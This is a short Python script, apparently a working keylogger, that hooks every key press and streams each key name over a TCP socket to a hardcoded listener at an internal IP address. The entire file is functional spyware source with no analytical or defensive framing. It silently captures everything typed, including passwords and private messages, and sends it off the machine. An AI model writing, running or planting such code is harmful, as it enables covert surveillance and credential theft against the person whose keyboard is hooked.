import keyboard
import socket

# Set up the socket connection
host = '10.173.240.87'
port = 8080

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the listener
sock.connect((host, port))

print("Connected to the listener!")

# Function to send keystrokes to the listener
def send_keystroke(event):
    try:
        sock.send(event.name.encode())
    except:
        print("Error sending keystroke!")

# Hook the keyboard events
keyboard.on_press(send_keystroke)

# Keep the script running
while True :
    pass